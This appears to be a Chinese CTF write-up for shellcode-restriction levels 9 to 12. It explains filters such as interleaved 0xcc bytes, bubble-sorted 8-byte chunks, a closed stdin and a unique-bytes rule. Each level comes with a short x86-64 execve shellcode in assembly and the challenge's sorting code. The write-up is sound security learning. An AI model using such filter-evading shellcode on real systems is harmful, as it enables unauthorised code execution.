    This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an instruction is an `INT 3`, which is an interrupt to call into the debugger. You must avoid these modifications in your
    shellcode.
    

那就和宏汇编还有跳转指令一起使用就行了吧，这里用上上面的mini shellcode：

    
    
    push 0x63
        mov rdi, rsp
        xor esi, esi
        cdq
        jmp next
        .rept 10
        nop
        .endr
    next:
        mov al,0x3b
        syscall
    

## level10~11：汇编代码排序

10：这一关让编写大端序的代码，要求如下：

    
    
    This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort
    (e.g., the LSB being the right-most byte).
    

这里顺便先了解一下python-pwntools怎么设置生成大端序的代码，输入如下代码即可将之后生成的代码设置为大端序的：

    
    
    context.endian = 'big'
    

不过amd64好像没有大端序顺序，所以pwntools不能直接生成。因为大小端序跟硬件的体系结构有关，所有x86系列的pc机都是小端序，跟操作系统无关。在x86系列的pc上的solaris系统是小端序，sun
sparc平台的solaris是大端序。

我用上面的mini shellcode居然直接过了，难道它的大端序没起作用？还是说只有在有字符串时才起作用？

字节序，又称端序，尾序，英文：Endianness。

在[计算机体系结构](http://www.ed2kers.com/%E5%9B%BE%E4%B9%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8E%E7%BD%91%E7%BB%9C/403079.html)中，字节序是指存放多字节数据的字节（byte）的顺序，典型的情况是整数在内存中的存放方式和网络传输的传输顺序。Endianness有时候也可以用指位序（bit）。

大端字节序，高字节存于内存低地址，低字节存于内存高地址；小端字节序反之。

嗯，复习一下正好，其实大端序和小端序在存储多位的数据体才会有区别。

但是我对照了实验了一下后发现怎么也对不上，不是大端序小端序的排序区别啊。

看一下挑战的相关代码吧：

    
    
    puts("Executing filter...\n");
        uint64_t *input = shellcode_mem;
        int sort_max = shellcode_size / sizeof(uint64_t) - 1;
        for (int i = 0; i < sort_max; i++)
            for (int j = 0; j < sort_max-i-1; j++)
                if (input[j] > input[j+1])
                {
                    uint64_t x = input[j];
                    uint64_t y = input[j+1];
                    input[j] = y;
                    input[j+1] = x;
                }
    

嗯？这个代码不就是对每8字节的汇编代码运行了一次冒泡排序吗？让代表数字更小的汇编代码到前面，和大端序小端序没半毛钱关系啊。

结果我又回去看了下人家的题目描述，发现是我开始理解错了，人家开始就说是对我的代码进行一次“冒泡排序”，并没有说这就是大端序啊，这个过滤和大端序无关。。。

也就是说这道题只需要一个很短的排序后不影响运行的shellcode即可，之前是在瞎搞。

算了，反正也复习到了，也不错。

11：也会对汇编代码进行冒泡排序，除此之外还关闭了标准输入：

    
    
    This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.
    

额，我本来就没用到标准输入，原来第10关可以通过输入来通过的吗？

不太清楚他所说的通关方式是什么，反正11关还能用之前第10关用过的代码。

## level12：每一字节都不同

12：要求输入的机器代码每一个字节都不一样。

感觉应该不算难，还是考基础的，利用不同的命令来替换即可。

改一下之前的mini shellcode吧，比较短也比较好改：

    
    
    push 0x63
        mov rdi, rsp
        xor esi, esi
        cdq
        mov al,0x3b
        syscall
    

结果看了一下，这个好像已经满足条件了，每一个字节都不一样，额。。不用再忙活了。

反正思路是有的，数据操作互相替换即可：mov、push、or、and、xor、inc，imult、div、shl、shr等等，总能替换好吧。

